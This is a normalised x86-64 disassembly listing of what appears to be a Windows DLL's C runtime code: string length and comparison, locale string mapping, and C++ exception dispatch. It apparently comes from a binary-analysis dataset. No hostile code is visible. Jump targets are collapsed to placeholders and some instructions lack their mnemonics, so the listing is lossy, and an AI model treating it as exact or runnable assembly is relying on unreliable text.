mov [ rcx + r8 + 0x2c250 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_180012ea4
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_18000ec1c
sub_180010eec
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_180010f78
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_18001101c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_18000ec1c
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_18000ec1c
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_18000ec1c
mov rcx [ rbx + 0x130 ]
call sub_18000ec1c
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_180015584
mov rcx [ rbx + 0x158 ]
call sub_18000ec1c
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_18000ec1c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x110 ]
call sub_18000ec1c
mov rcx [ rbx + 0x128 ]
call sub_18000ec1c
cmp [ rcx ] 0x0
jne r-xdata
call sub_18000ec1c
mov rcx [ rbx + 0x128 ]
call sub_1800159e0
call sub_18000ec1c
call sub_18000ec1c
mov rcx [ rbx + 0x128 ]
call sub_180015974
sub_180011198
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_180010eec
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_180010f78
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_18001101c
sub_1800111f0
push rbx
sub rsp 0x20
call sub_18000f510
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_180012fa4
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_180011198
mov rbx rax
mov ecx 0xc
call sub_180012ea4
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_18000f08c
call sub_18000f510
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_180011268
jmp r-xdata
mov al [ rcx ]
test al al
jne r-xdata
cmp al dl
je r-xdata
cmp al dl
jne r-xdata
mov rax rcx
retn
inc rcx
xor eax eax
retn
sub_1800112a0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_180011348
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_18000c060
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_18000c27c
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_18000ec1c
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000d8d0
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_18000c27c
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_18000ec1c
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000d8d0
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180011614
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_18000cd7c
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_180011348
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800116ac
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_1800116e8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_18000cd7c
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub rsi rdi
mov rdx rdi
mov rcx rsi
call sub_1800116ac
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rsi + rdi ]
lea rdx [ rbp - 0x20 ]
call sub_180015aec
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_180015aec
inc rdi
test ebx ebx
je r-xdata
sub_1800117c0
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
add rsp 0x28
jmp sub_1800116e8
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
mov eax 0x7fffffff
add rsp 0x28
retn
add rsp 0x28
jmp sub_1800116ac
sub_180011824
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_18000ea3c
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18000e9d4
mov eax ebx
sub_180011888
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_180012d48
xor ecx ecx
test edi edi
je r-xdata
call sub_180012d48
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180011950
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_18000d24c
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_1800119c8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18000d068
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000ec1c
sub_180011a04
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
test esi esi
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_18000d338
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_18000d338
lea r11 [ rsi + rax ]
jmp r-xdata
test esi esi
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_18000d338
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_18000d350
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_18000d338
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_18000d350
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_18000daf0
test eax eax
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_180011b28
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434352
je r-xdata
call sub_18000f510
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe0434f4d
je r-xdata
xor eax eax
add rsp 0x28
retn
call sub_18000f510
dec [ rax + 0x100 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
call sub_18000f510
and [ rax + 0x100 ] 0x0
call sub_180012d24
sub_180011b7c
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov r15 rdx
mov r14 rcx
call sub_18001191c
mov edi eax
call sub_18000d338
mov [ rsp + 0x28 ] rax
call sub_18000f510
inc [ rax + 0x100 ]
call sub_18000f510
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_18000f510
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_180011944
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_180012d48
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_180012d48
movsxd r12 edi
call sub_18000d338
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_18000d338
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_18000d338
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18000d338
add rax rbx
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_180011944
call sub_18000d338
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
jmp r-xdata
xor eax eax
call sub_18000d338
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18000d338
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_180015c50
mov rcx [ rsp + 0x28 ]
call sub_18000d368
sub_180011d08
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_180011d70
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_180012d48
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_18000d350
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_18000d350
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_18000d350
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_18000d338
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_180011a04
test eax eax
jne r-xdata
jmp r-xdata
sub_180011e44
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov rdi rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
and [ rsp + 0xc0 ] r13d
and [ rsp + 0x48 ] r13
and [ rsp + 0x40 ] r13
call sub_18000f510
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xd8 ] rax
call sub_18000f510
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xd0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xc8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov r15 [ rdi + 0x30 ]
mov r12 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r12
call sub_18000f510
mov [ rax + 0xf0 ] rsi
call sub_18000f510
mov [ rax + 0xf8 ] rbx
call sub_18000f510
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_18000d6f8
mov r14 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r13
je r-xdata
mov r8d 0x100
mov rdx r12
mov rcx r15
call sub_180015c50
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
jmp r-xdata
mov [ rsp + 0xc0 ] 0x1
call sub_18000f510
mov rcx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rcx
mov rcx r14
call sub_18000d770
test r13d r13d
jne r-xdata
call sub_18000f510
mov [ rax + 0xf0 ] r15
call sub_18000f510
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_18000d73c
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_180011d08
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_180011f49
mov [ rsp + 0x20 ] 0x1
call sub_18000f510
and [ rax + 0x2c0 ] 0x0
mov rsi [ rsp + 0xc8 ]
cmp [ rsp + 0xc0 ] 0x0
je r-xdata
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
mov dl 0x1
mov rcx rsi
call sub_180011d08
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
jmp r-xdata
call sub_18000f510
mov [ rax + 0xf0 ] r15
call sub_18000f510
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
call [ RaiseException@IAT ]
mov r13d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
mov r12 [ rsp + 0x60 ]
mov r14 [ rsp + 0x50 ]
mov rcx r14
call sub_18000d770
test r13d r13d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_18000d73c
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_180011d08
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_180012058
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
test r13d r13d
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_18000d338
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
test r13d r13d
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
call sub_18000d338
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ rdi ]
test ecx ecx
js r-xdata
test [ rdi ] 0x80000000
je r-xdata
mov edi 0x1
test cl 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
test [ rsi ] dil
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180015c98
test eax eax
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180015c98
test eax eax
je r-xdata
call sub_180012d48
mov edx edi
mov rcx r12
call sub_180015c98
test eax eax
je r-xdata
mov r11 rbx
call sub_18000d350
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180015c98
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
call sub_180015c98
test eax eax
je r-xdata
call sub_180015c98
test eax eax
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
test r11 r11
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_18000c440
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180015c98
test eax eax
je r-xdata
mov edx edi
mov rcx r12
call sub_180015c98
test eax eax
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_180011d4c
mov rdx rax
mov r8 r10
mov rcx r12
